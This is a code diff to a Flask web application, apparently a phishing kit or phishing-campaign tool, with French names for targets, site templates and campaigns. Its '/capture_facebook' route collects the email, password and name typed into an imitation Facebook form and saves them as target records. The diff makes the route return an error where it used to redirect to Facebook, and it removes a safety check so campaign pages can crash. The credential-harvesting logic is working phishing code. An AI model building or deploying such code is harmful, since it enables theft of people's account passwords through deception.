@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect, url_for, flash, session
+from flask import Flask, render_template, request, redirect, url_for, flash, session,abort
 from app.models import db, Cible, TemplateSite,Utilisateur, Campagne
 
 
@@ -89,12 +89,12 @@ def register_routes(app: Flask, db):
  
     @app.route('/capture_facebook', methods=['POST'])
     def capture_facebook():
+
         email = request.form.get('email')
         password = request.form.get('password')
         nom = request.form.get('nom')
         prenom =request.form.get('prenom')
 
-        # Récupération du template "google"
         template = TemplateSite.query.filter_by(nom='facebook').first()
 
         cible = Cible(
@@ -108,7 +108,7 @@ def register_routes(app: Flask, db):
         db.session.add(cible)
         db.session.commit()
 
-        return redirect("https://www.facebook.com")
+        return abort(500)
     
     @app.route("/deconnexion")
     def logout():
@@ -149,11 +149,9 @@ def register_routes(app: Flask, db):
         if not campagne:
             abort(404)
         
-        # Récupérer le template associé à la campagne
         template = campagne.template
 
-        # Récupérer les cibles associées au template
-        cibles = template.cibles if template else []
+        cibles = template.cibles 
 
         return render_template("campagnes_id.html", campagne=campagne, cibles=cibles)
 
